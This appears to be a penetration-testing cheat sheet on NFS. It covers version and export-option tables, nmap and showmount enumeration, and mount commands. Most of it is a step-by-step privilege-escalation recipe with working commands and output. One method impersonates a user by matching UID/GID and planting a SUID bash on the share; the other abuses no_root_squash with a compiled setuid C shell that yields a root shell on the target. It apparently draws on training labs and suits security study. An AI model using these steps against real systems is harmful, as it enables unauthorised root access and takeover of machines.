#### Versions

| **Version** | **Features**                                                                                                                                                                                                                                                         |
| ----------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `NFSv2`     | It is older but is supported by many systems and was initially operated entirely over UDP.                                                                                                                                                                           |
| `NFSv3`     | It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.                                                                                                                                       |
| `NFSv4`     | It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol. |
#### Options

| **Option**         | **Description**                                                                                                                             |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `rw`               | Read and write permissions.                                                                                                                 |
| `ro`               | Read only permissions.                                                                                                                      |
| `sync`             | Synchronous data transfer. (A bit slower)                                                                                                   |
| `async`            | Asynchronous data transfer. (A bit faster)                                                                                                  |
| `secure`           | Ports above 1024 will not be used.                                                                                                          |
| `insecure`         | Ports above 1024 will be used.                                                                                                              |
| `no_subtree_check` | This option disables the checking of subdirectory trees.                                                                                    |
| `root_squash`      | Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount. |
#### Scanning

````bash
sudo nmap x.x.x.x -p111,2049 -sV -sC
sudo nmap --script nfs* x.x.x.x -sV -p111,2049
````

Viewing Who can access the NFS device:

```bash
showmount -e x.x.x.x
```

Mount NFS share::

```bash
mkdir target-NFS
sudo mount -t nfs x.x.x.x:/ ./target-NFS/ -o nolock
```

Or:

```bash
sudo mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
cd target-NFS
tree .
sudo umount ./target-NFS
````
### Privilege Escalation

Targets configuration file:

```bash
cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

| Option           | Description                                                                                                                   |
| ---------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| `root_squash`    | Converts root access to an unprivileged user (`nfsnobody`), preventing root-owned file creation and potential security risks. |
| `no_root_squash` | Allows root access to create files as root, which can be a security risk.                                                     |
|                  |                                                                                                                               |
The following example defaults to `root_squash`:

```
/opt/share *(rw,no_subtree_check)
```

### Escalate to none Root user:

We may be able to escalate to a none root user if we have read/write access to the share, a shell is required on the target system.

Find the UID & GUID of the target user:

```bash
www-data@mail01:/home$ ls -ln    
drwx------ 4 902601108 902600513 4096 Jun 18  2023 peter.turner@hybrid.vl
```

Take note of the UID & GID

```bash
UID = 902601108
GID = 902600513
```

Create a new user on the attacking system using these settings:

```bash
sudo groupadd -g 902600513 ptgroup
sudo useradd -u 902601108 -g 902600513 attacker
sudo su - attacker
```

Mount the NFS share on the attacking system:

```bash
mount -t nfs 10.10.157.54:/opt/share ./nfs/ -o nolock
cd nfs
```

Copy `/bin/bash/` to the share and set the SUID:

```bash
cp /bin/bash .
chmod u+s ./bash
```

In the shell run `bash`

```bash
./bash -p
bash-5.1$ id
id
uid=33(www-data) gid=33(www-data) euid=902601108(peter.turner@hybrid.vl) groups=33(www-data)
bash-5.1$ whoami
whoami
peter.turner@hybrid.vl
```

### Escalate to Root

With the `no_root_squash`, we can escalate to `root`.

From the attacking system:

```bash
showmount -e 10.129.2.210
Export list for 10.129.2.210:
/tmp             *
/var/nfs/general *
```

Use the following c code:

```bash
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

Compile:

```bash
gcc shell.c -o shell --static
```

Mount target:

```bash
mkdir priv_esc
sudo mount -t nfs 10.129.2.210:/tmp priv_esc/
cp shell priv_esc/
cd priv_esc/
su root
chmod u+s shell <-- Make sure you are root locally
```

Back on target:

``` bash
cd /tmp
ls -lash
total 68K
4.0K drwxrwxrwt 13 root root 4.0K Feb  4 12:06 .
4.0K drwxr-xr-x 25 root root 4.0K Jan 25  2024 ..
4.0K drwxrwxrwt  2 root root 4.0K Feb  4 11:55 .font-unix
4.0K drwxrwxrwt  2 root root 4.0K Feb  4 11:55 .ICE-unix
 16K -rwsr-xr-x  1 root root  16K Feb  4 12:06 shell

 ./shell 
# id
uid=0(root) gid=0(root) groups=0(root),1008(htb-student)
```

